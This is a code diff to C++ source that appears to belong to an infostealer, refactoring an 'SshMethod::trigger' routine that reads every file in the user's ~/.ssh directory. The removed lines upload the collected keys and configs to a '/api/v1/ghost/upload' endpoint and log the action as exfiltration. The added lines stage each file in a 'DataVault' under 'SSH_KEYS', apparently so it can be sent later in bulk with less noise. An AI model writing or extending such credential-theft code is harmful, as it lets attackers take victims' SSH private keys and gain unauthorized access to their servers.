@@ -2,28 +2,25 @@
 #include "utils/FileUtils.hpp"
 #include "utils/SystemUtils.hpp"
 #include "utils/Logger.hpp"
-#include "network/Comms.hpp"
+#include "utils/DataVault.hpp"
 
 bool SshMethod::trigger() {
     std::string homeDir = SystemUtils::GetUserHome();
     std::string sshDir = homeDir + "/.ssh";
 
     std::vector<std::string> files = FileUtils::ListFilesRecursively(sshDir);
-    std::string data;
 
     int successCount = 0;
     for (const auto& filePath : files) {
-        LOG_INFO("Attempting exfiltration of {}", filePath)
-        data += "=== " + filePath + " ===";
-        data += FileUtils::ReadFile(filePath);
-        data += '\n';
+        LOG_INFO("Reading {}", filePath)
+        std::string data = FileUtils::ReadFile(filePath);
 
-        successCount++;
+        if (!data.empty()) {
+            std::string formattedData = "=== " + filePath + " ===\n" + data;
+            DataVault::Append("SSH_KEYS", formattedData);
+            successCount++;
+        }
     }
 
-    if (data.empty()) return false;
-
-    // TODO: think about aggregating all info and sending in one request, this is highly inefficient and generates a lot of noise
-    LOG_INFO("Uploading ssh creds and config")
-    return Comms::UploadFile("/api/v1/ghost/upload", "ssh.txt", data);
+    return successCount > 0;
 }
